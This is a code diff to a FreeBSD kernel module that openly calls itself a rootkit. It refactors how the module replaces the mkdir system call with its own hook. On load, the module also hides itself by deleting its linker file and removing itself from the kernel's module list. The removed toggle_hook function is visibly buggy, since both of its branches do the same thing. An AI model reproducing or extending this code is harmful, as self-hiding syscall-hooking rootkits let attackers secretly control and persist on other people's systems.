@@ -18,6 +18,7 @@
 #include "config.h"
 #include "debug.h"
 #include "privilege.h"
+#include "hook.h"
 
 static int
 load(struct module *module, int cmd, void *arg)
@@ -26,12 +27,12 @@ load(struct module *module, int cmd, void *arg)
 	{
 		case MOD_LOAD:
 			LOGI("[rootkit:load] Rootkit loaded.\n");
-			toggle_hook(ON, SYS_mkdir, mkdir_hook);
+			hook_syscall_set(SYS_mkdir, mkdir_hook);
 			remove_linker_file("rootkit.ko");
 			remove_module_from_kernel("rootkit");
 			break;
 		case MOD_UNLOAD:
-			toggle_hook(OFF, SYS_mkdir, sys_mkdir);
+			hook_syscall_set(SYS_mkdir, sys_mkdir);
 			LOGI("[rootkit:load] Rootkit unloaded.\n");
 			break;
 		default:
@@ -64,18 +65,6 @@ mkdir_hook(struct thread *td, void *syscall_args) {
 	}
 
 	return(sys_mkdir(td, syscall_args));
-}
-
-void
-toggle_hook(char *state, int sys_call_num, void *dest_func)
-{
-	if (strcmp(state, "on"))
-	{
-		sysent[sys_call_num].sy_call = (sy_call_t *) dest_func;
-		return;
-	}
-
-	sysent[sys_call_num].sy_call = (sy_call_t *) dest_func;
 }
 
 int
